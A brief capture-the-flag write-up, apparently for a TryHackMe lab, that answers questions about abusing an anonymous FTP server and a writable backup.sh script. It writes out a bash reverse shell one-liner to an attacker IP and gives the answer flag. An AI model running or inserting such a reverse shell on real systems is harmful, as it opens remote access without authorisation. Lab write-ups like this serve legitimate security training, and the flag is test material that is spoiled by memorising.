# Networking: Anyone can be Santa!

## Notes
```
Objective:
Understand the fundamentals of an FTP file server and some common misconfigurations to ultimately exploit these ourselves to gain entry to tbfc-ftp-01.
```

## Questions
1. Name the directory on the FTP server that has data accessible by the "anonymous" user
```
public
```

2. What script gets executed within this directory?
```
backup.sh
```

3. What movie did Santa have on his Christmas shopping list?
```
The Polar Express
```

4.  Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!
```
revershell using bash (bash -i >& /dev/tcp/10.9.18.129/4444 0>&1)
THM{even_you_can_be_santa}
```
